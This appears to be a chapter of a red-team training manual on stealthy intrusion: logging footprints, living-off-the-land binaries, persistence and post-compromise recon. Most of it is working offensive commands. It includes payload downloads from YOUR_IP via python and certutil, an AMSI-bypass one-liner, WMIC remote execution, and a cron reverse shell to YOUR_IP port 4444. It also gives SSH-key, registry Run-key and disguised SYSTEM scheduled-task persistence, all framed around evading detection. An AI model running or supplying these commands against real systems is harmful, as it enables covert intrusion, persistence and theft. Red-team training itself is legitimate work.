# VOLUME VII — Red Team & OPSEC Awareness

> *"Hackers break things. Red teamers break things without anyone noticing."*

---

## Chapter 1: The Noise Problem

Every action you take on a target generates **logs, events, and network telemetry**. Red team operations require constant awareness of the footprint you leave.

### 1.1 — What Generates Logs

| Action | What Gets Logged |
|--------|-----------------|
| Nmap SYN scan (`-sS`) | Firewall logs: SYN packets from your IP to every port |
| Brute force attempt | Auth logs: `/var/log/auth.log`, Windows Event ID 4625 |
| `net use` or SMB access | Windows Event ID 4624 (login), 4776 (credential validation) |
| Powershell download/exec | Windows Event ID 4104 (Script Block Logging if enabled) |
| Domain enumeration (BloodHound) | LDAP query logs in domain controller Event ID 1644 |
| New user creation | Event ID 4720 |
| Scheduled task creation | Event ID 4698 |

### 1.2 — Reducing Noise

- **Scan slow and targeted**, not loud and fast. Use `nmap -T2` instead of `-T5`.
- **Avoid default ports first** if you suspect monitoring. Check if common administrative ports (8080, 8443, 9200) have looser logging.
- **Avoid `metasploit` multi/handler** on engagements where EDR is likely. Use manual shellcode or `sliver`/`havoc` C2 frameworks with custom profiles.

---

## Chapter 2: Living Off the Land (LOLBin Philosophy)

Do not bring your own tools if the target's tools do the same job. Every custom binary you drop on disk is a detection signature.

### 2.1 — Linux LOLBins

| Goal | Native Binary |
|------|--------------|
| File Download | `curl`, `wget`, `python3 -c 'import urllib.request...'`, `bash /dev/tcp` |
| File Transfer | `base64` encode + paste, `scp`, `nc` (if available) |
| Port Scanning | `bash` for loops with `/dev/tcp/IP/PORT`, `nc -zv` |
| Privilege Check | `sudo -l`, `getcap -r / 2>/dev/null`, `find -perm -4000` |

```bash
# File download without curl/wget
python3 -c "import urllib.request; urllib.request.urlretrieve('http://YOUR_IP/linpeas.sh', '/tmp/pe.sh')"

# Port scanning with bash TCP
for port in 21 22 80 443 445 3306 6379; do (echo >/dev/tcp/TARGET/$port) 2>/dev/null && echo "OPEN: $port"; done
```

### 2.2 — Windows LOLBins (LOLBAS)

| Goal | LOLBin |
|------|--------|
| File Download | `certutil -urlcache -f URL FILE`, `bitsadmin /transfer`, `Invoke-WebRequest` (PS) |
| Code Execution | `msiexec`, `regsvr32`, `rundll32`, `mshta` |
| Lateral Movement | `wmic /node:TARGET process call create CMD`, `winrm`, `sc \\TARGET start SERVICE` |
| Defense Evasion | `forfiles`, `at` (scheduled tasks), `eventvwr.exe` (UAC bypass) |

```powershell
# Download file via certutil (bypasses basic proxy restrictions)
certutil -urlcache -f http://YOUR_IP/payload.exe C:\Windows\Temp\p.exe

# Execute remotely via WMIC (no PSRemoting needed)
wmic /node:TARGET process call create "cmd.exe /c whoami > C:\tmp\out.txt"

# Bypass AMSI in current PowerShell session (one-liner)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## Chapter 3: Persistence & Staying In

### 3.1 — Linux Persistence

```bash
# Method 1: SSH Authorized Key (Stealthiest)
echo "YOUR_PUBLIC_SSH_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Method 2: Cron Job (Noisy if monitored)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1") | crontab -

# Method 3: PAM Backdoor (Advanced - accepts master password for any user)
# Requires root. Modifies /etc/pam.d/common-auth.
```

### 3.2 — Windows Persistence

```powershell
# Method 1: Registry Run Key
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\implant.exe" /f

# Method 2: Scheduled Task (Less obvious than registry)
schtasks /create /sc MINUTE /mo 5 /tn "Windows Update Helper" /tr "C:\Windows\Temp\implant.exe" /ru SYSTEM

# Method 3: WMI Event Subscription (Fileless, hardest to detect)
# Triggers on specific events without writing files to disk.
# Refer to your C2 framework documentation for WMI subscription persistence.
```

---

## Chapter 4: Post-Exploitation Intelligence Gathering

When you land on a machine, before you do anything noisy, silently enumerate your context.

```bash
# Linux: Who are you, where are you, what is around you?
whoami; id; hostname; ip a; ss -tnlp; ps aux | grep -v '\['; cat /etc/passwd | grep -v nologin
```
```powershell
# Windows: Silent recon
whoami /all         # User, groups, AND privileges — do this FIRST
ipconfig /all       # Network interfaces and DNS servers
netstat -ano        # Open connections and listening ports
tasklist /SVC       # Processes and their associated services
```

> **Critical:** Check `whoami /priv` or `id` IMMEDIATELY on landing. `SeImpersonatePrivilege` on Windows or `docker` group membership on Linux means you are minutes from root.
